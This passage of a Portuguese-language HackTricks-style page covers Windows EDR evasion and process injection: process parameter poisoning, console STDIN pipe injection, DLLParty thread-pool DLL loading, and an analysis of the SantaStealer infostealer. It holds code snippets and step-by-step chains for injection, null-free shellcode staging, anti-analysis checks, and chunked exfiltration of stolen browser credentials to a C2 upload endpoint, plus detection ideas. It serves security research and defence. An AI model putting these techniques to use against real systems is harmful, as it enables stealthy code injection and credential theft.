- `lpEnvironment` (com `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Restrições práticas dos carriers:

- `lpCommandLine` deve apontar para **memória gravável** para `CreateProcessW` e está limitado a **32,767 caracteres Unicode**, incluindo o terminador nulo.
- `lpEnvironment` deve ser um bloco de ambiente Unicode com strings `NAME=VALUE\0` consecutivas, terminadas por um `\0` extra.
- `lpReserved` é oficialmente reservado, portanto o mapeamento para `ShellInfo` deve ser tratado como um detalhe de implementação, não como um contrato documentado estável.

Isso transforma a criação normal de processos na **primitiva de transferência de payload**. O operador cria o processo filho com dados de inicialização controlados pelo atacante e deixa o Windows fazer a cópia entre processos.

### Fluxo de busca remota sem APIs de gravação remota

Após a criação do processo filho, resolva o buffer copiado com primitivas **somente de leitura**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obter `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ler o `PEB` remoto
3. Seguir `PEB.ProcessParameters`
4. Ler `RTL_USER_PROCESS_PARAMETERS`
5. Usar o ponteiro selecionado:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Fluxo mínimo:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Executando o buffer de parâmetros copiado

A região de parâmetros copiada geralmente é `RW`, não executável. Uma cadeia P3 comum é:

1. Criar o processo normalmente (não suspenso)
2. Tornar executável a página de parâmetros escolhida com `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Reutilizar o identificador da thread principal já retornado em `PROCESS_INFORMATION`
4. Redirecionar a execução com `NtSetContextThread` (`CONTEXT_CONTROL`, sobrescrever `RIP`)

Ao contrário dos fluxos clássicos de thread hijacking, isso **não exige** `SuspendThread` / `ResumeThread`; o contexto pode ser alterado diretamente no identificador da thread principal retornado.

Isso evita várias APIs comumente monitoradas para injeção:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- muitas vezes também `SuspendThread` / `ResumeThread`

### Limitação de byte nulo e shellcode em etapas

Os três carriers são **dados em formato de string ou semelhantes a string**, portanto um payload bruto que contenha `0x00` é truncado durante a transferência. Uma solução prática é uma **primeira etapa null-free** que reconstrói constantes em tempo de execução e, em seguida, carrega uma segunda etapa arbitrária.

Um padrão simples é a síntese de constantes baseada em XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Isso permite que o primeiro estágio construa strings na stack, argumentos de API, caminhos de DLL ou um loader de shellcode de segundo estágio sem incluir bytes nulos no parâmetro transportado.

### Chamadas de API baseadas na stack pelo primeiro estágio

Quando o primeiro estágio precisa chamar APIs como `LoadLibraryA`, ele pode:

- colocar a string/buffer na stack do processo de destino
- reservar o **shadow space de 32 bytes do x64**
- definir `RCX`, `RDX`, `R8`, `R9` com constantes ou ponteiros relativos a `RSP`
- manter `RSP` **alinhado em 16 bytes** antes da chamada

Um segundo estágio pode então ser copiado da stack para uma alocação `PAGE_READWRITE`, alterado para `PAGE_EXECUTE_READ` com `VirtualProtect` e executado por salto, evitando uma alocação RWX direta.

### Ideias para detecção

Boas oportunidades de investigação mencionadas pelos autores:

- `VirtualProtectEx` / `NtProtectVirtualMemory` tornando **executáveis páginas dos parâmetros do processo**
- essa alteração de proteção seguida por `SetThreadContext` / `NtSetContextThread`
- leituras remotas da `PEB` e, em seguida, de `RTL_USER_PROCESS_PARAMETERS`
- valores de `lpCommandLine`, `lpEnvironment` ou `STARTUPINFO.lpReserved` excepcionalmente longos ou com alta entropia durante a criação do processo

### Observações

- P3 é um **truque de transferência entre processos**, não uma primitiva de execução completa por si só: o parâmetro copiado ainda precisa de uma alteração de permissão para execução e de um método de redirecionamento da execução.
- `RtlCreateProcessReflection` / Dirty Vanity foi considerado pelos autores, mas rejeitado porque internamente chega a primitivas suspeitas, como `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Injeção por pipe de STDIN do console

Um processo filho de console interativo também pode ser usado como **primitiva de transferência de payload**. O injector redireciona a entrada padrão do filho para um pipe e envia um marcador seguido de shellcode. Depois que o programa de console lê os dados para sua própria memória privada, o injector localiza esse buffer, torna-o executável e redireciona uma thread do processo filho para ele. Isso evita `VirtualAllocEx` e `WriteProcessMemory`, mas ainda é injeção de processo, não um bypass genérico de EDR.<sup>[[41]](#references)</sup>

Apesar da descrição como "named-pipe", a implementação de referência chama `CreatePipe`, que cria um **pipe anônimo**. O Windows implementa pipes anônimos com objetos de pipe nomeados exclusivos internamente, mas o PoC não seleciona um caminho `\\.\pipe\<name>` nem chama `CreateNamedPipe`. Ele cria handles herdáveis com um descritor de segurança padrão, coloca o handle de leitura em `STARTUPINFO.hStdInput`, define `STARTF_USESTDHANDLES` e inicia um novo processo filho com a herança de handles habilitada. Portanto, esse PoC inicia o executável de console fornecido; ele não conecta seu pipe a um processo existente.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Fluxo de trabalho de referência

A implementação usa a seguinte cadeia:<sup>[[41]](#references)</sup>

1. Cria pares de pipes anônimos para `STDIN` e `STDOUT` do processo filho. Desabilita a herança nos dois handles do lado do processo pai e fecha no processo pai as cópias dos handles do lado do processo filho após a criação do processo.
2. Inicia um executável interativo, como `netsh.exe` ou `nslookup.exe`, com `CREATE_NEW_CONSOLE`. O processo filho herda os handles padrão redirecionados.
3. Envia o array binário completo `rawData` com `WriteFile` pelo handle de `STDIN` do lado do processo pai. O programa de console consome os bytes e deixa uma cópia em uma de suas regiões privadas confirmadas.
4. Percorre o espaço de endereçamento do processo filho com `VirtualQueryEx`, lê regiões candidatas `MEM_PRIVATE` com `ReadProcessMemory` e procura o marcador no início de `rawData`.
5. Altera o buffer encontrado para `PAGE_EXECUTE_READWRITE` com `VirtualProtectEx`.
6. Identifica a thread principal, suspende-a, define `RIP` como `found_address + 0x19` com `NtSetContextThread` e a retoma.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

A implementação fornecida é específica para x64: ela modifica `CONTEXT.Rip`, e o payload incorporado é shellcode x64. `rawData` começa com um marcador de 25 bytes, portanto os bytes executáveis começam no offset hexadecimal `0x19`. Ao substituir o payload, preserve esse layout ou atualize juntos o marcador, o vetor de busca, o tamanho do array e o offset de execução. Os comentários do código também listam `0x0A`, `0x0D` e `0x1A` como caracteres inválidos. Esse fluxo de trabalho não altera o token nem os privilégios do processo filho.<sup>[[41]](#references)</sup>

Para helpers nativos pequenos e padrões de compilação de payloads, consulte [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Injeção de DLL por callback de thread pool sem shellcode (DLLParty)

O DLLParty adapta a injeção de thread pool no estilo PoolParty para fazer um worker existente do alvo chamar `LoadLibraryA`, em vez de executar um stub de callback injetado. Seu primitivo de dispatch é um completion `TP_DIRECT` enfileirado na porta de conclusão de I/O do pool do alvo. Isso não contorna as permissões do processo: o PoC chama `OpenProcess(PROCESS_ALL_ACCESS)` e precisa de memória do alvo legível e gravável, além de handles de worker-factory e de porta de conclusão que possam ser duplicados.<sup>[[46]](#references)[[47]](#references)</sup>

No Windows x64, o worker passa um ponteiro para um `TP_CALLBACK_INSTANCE` alocado na pilha em `RCX`, o primeiro argumento do callback. `LoadLibraryA` interpreta esse mesmo ponteiro como um `LPCSTR`. No caminho testado, `TppWorkerThread` cria o ponteiro em `RSP+0x178`, enquanto sua primeira gravação comum nesse objeto ocorre em `RSP+0x1d0`. Portanto, um caminho de DLL terminado em nulo que caiba nesse prefixo de 0x58 bytes pode ocupar o início da instância sem ser sobrescrito antes do dispatch. Essa observação é específica da build testada, não uma garantia documentada da ABI do Windows.<sup>[[46]](#references)[[47]](#references)</sup>

O fluxo de trabalho de referência é:<sup>[[46]](#references)[[47]](#references)</sup>

1. Enumere os handles do alvo com `NtQuerySystemInformation(SystemHandleInformation)` e identifique `TpWorkerFactory` consultando os tipos de objeto. Duplique um handle de worker-factory e consulte `WorkerFactoryBasicInformation`; `StartParameter` fornece o `TP_POOL` remoto. Ignore factories com `TotalWorkerCount == 0`.
2. Leia `TP_POOL.CompletionPort` e percorra a lista privada de workers do pool. Na build x64 testada do Windows 10 19045 (`ntdll.dll 10.0.19041.4842`), o início da lista fica em `pool+0x60`; cada link fica em `worker+0x10`, então o slot da instância de callback em `worker+0x38` equivale a `link+0x28`. O PoC verifica o alinhamento dos ponteiros, a reciprocidade dos links, a propriedade do pool, os IDs de thread diferentes de zero, nós repetidos e um início de lista estável.
3. Grave o caminho da DLL em **todos** os slots de worker recuperados, pois qualquer worker pode consumir o completion enfileirado. Coloque um `TP_DIRECT` em memória gravável do alvo, com `Callback = LoadLibraryA`. O PoC usa `last_slot-0x500` em uma pilha de worker em vez de `VirtualAllocEx`; esse offset é experimental e não pode colidir com dados ativos da pilha.
4. Duplique o handle da porta de conclusão do alvo e chame `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. O endereço do `TP_DIRECT` remoto é a chave de conclusão. Um worker existente então chama `LoadLibraryA` usando o ponteiro sobrescrito da instância de callback, carregando uma DLL já acessível ao alvo.

O PoC recebe um PID de alvo (`DLLParty.exe <target_pid>`) e usa um caminho de DLL codificado em `DLLParty.cpp`; defina um caminho acessível ao alvo antes de compilar um executável x64. Ele também usa o endereço de `LoadLibraryA` do próprio processo como callback remoto, portanto presume que esse endereço seja válido no alvo. O código não verifica se o comprimento do caminho cabe no prefixo de 0x58 bytes, nem se a travessia dos workers encontrou um slot antes de indexar o último elemento. Valide novamente os offsets privados, o layout da pilha e o espaço gravável para a build do alvo. Omitir `CreateRemoteThreadEx`, shellcode e `VirtualAllocEx` não elimina gravações entre processos nem a telemetria de carregamento de DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Técnicas do SantaStealer para evasão sem arquivo e roubo de credenciais

O SantaStealer (também conhecido como BluelineStealer) demonstra como os infostealers modernos combinam bypass de AV, anti-análise e acesso a credenciais em um único fluxo de trabalho.<sup>[[24]](#references)</sup>

### Verificação do layout do teclado e atraso em sandbox

- Uma flag de configuração (`anti_cis`) enumera os layouts de teclado instalados usando `GetKeyboardLayoutList`. Se um layout cirílico for encontrado, a amostra cria um marcador `CIS` vazio e termina antes de executar os stealers, garantindo que nunca seja detonada em localidades excluídas e deixando um artefato útil para hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Lógica em camadas de `check_antivm`

- A variante A percorre a lista de processos, calcula o hash de cada nome com um checksum de rolling personalizado e compara o resultado com blocklists incorporadas de debuggers/sandboxes; repete o cálculo do checksum para o nome do computador e verifica diretórios de trabalho, como `C:\analysis`.
- A variante B inspeciona propriedades do sistema (limite mínimo de processos, tempo de atividade recente), chama `OpenServiceA("VBoxGuest")` para detectar as adições do VirtualBox e realiza verificações de tempo em torno de pausas para detectar single-stepping. Qualquer detecção interrompe a execução antes do lançamento dos módulos.

### Helper sem arquivo + carregamento reflexivo com ChaCha20 duplo

- A DLL/EXE principal incorpora um helper de credenciais do Chromium que é gravado em disco ou mapeado manualmente na memória; no modo sem arquivo, ele resolve os imports/relocações por conta própria, sem gravar artefatos do helper.
- Esse helper armazena uma DLL de segundo estágio criptografada duas vezes com ChaCha20 (duas chaves de 32 bytes + nonces de 12 bytes). Após as duas passagens, ele carrega o blob de forma reflexiva (sem `LoadLibrary`) e chama as exportações `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivadas de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- As rotinas do ChromElevator usam direct-syscall reflective process hollowing para injetar em um navegador Chromium ativo, herdar chaves do AppBound Encryption e descriptografar senhas/cookies/cartões de crédito diretamente de bancos de dados SQLite, apesar das proteções do ABE.

### Coleta modular em memória e exfil HTTP em blocos

- `create_memory_based_log` percorre uma tabela global de ponteiros para funções `memory_generators` e cria uma thread por módulo habilitado (Telegram, Discord, Steam, capturas de tela, documentos, extensões de navegador etc.). Cada thread grava os resultados em buffers compartilhados e informa a quantidade de arquivos após uma janela de espera de cerca de 45s.
- Quando termina, tudo é compactado com a biblioteca `miniz` vinculada estaticamente como `%TEMP%\\Log.zip`. Em seguida, `ThreadPayload1` aguarda 15s e transmite o arquivo em blocos de 10 MB via HTTP POST para `http://<C2>:6767/upload`, falsificando um boundary `multipart/form-data` de navegador (`----WebKitFormBoundary***`). Cada bloco inclui `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opcional, e o último bloco acrescenta `complete: true` para que o C2 saiba que a remontagem foi concluída.

## References

- [1] [Técnicas avançadas de evasão: precision module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Pilhas de chamadas: chega de passes livres para malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentação](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – exemplo](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – exemplo](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC de falsificação de pilha de chamadas](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nova cadeia de infecção e ofuscação baseada em ConfuserEx para o DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Você deve confiar no seu zero trust? Contornando as verificações de postura do Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Antes do ToolShell: explorando operações anteriores de ransomware do Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abusando de exports encaminhadas](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventário de exports encaminhadas do Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordem de pesquisa de bibliotecas de vínculo dinâmico](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Segurança de processos e direitos de acesso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Referência de EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Inicializador CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Combatendo EDRs com a proteção de Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Rompendo a camada de proteção do Windows Defender com a técnica de redirecionamento de pastas](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referência do comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Sob a cortina pura: de RAT a builder e coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – O SantaStealer está chegando à cidade: um novo e ambicioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – descriptografia do Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: derrotando malware Node.js com rastreamento de API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Bela Adormecida: colocando o Adaptix para dormir com Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Envenenamento de parâmetros de processo](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Bela Adormecida II: CFG, CET e falsificação de pilha](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ofuscação de sono Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Ocultando o Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusando do Chrome Remote Desktop em operações Red Team: um guia prático](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: transformando o driver de remediação do Defender em uma primitiva de operação de kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Código complementar do Function Peekaboo da MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: criando funções de mascaramento próprio com LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Código-fonte do InjectSetConsole de TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Função CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Criando um processo filho com entrada e saída redirecionadas](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - Necromancia do GhostPack: reformulando ferramentas C# com WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compilando projetos C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Prova de conceito e código-fonte do DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — abusando dos componentes internos do pool de threads para injeção de DLL sem shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
{{#include ../banners/hacktricks-training.md}}
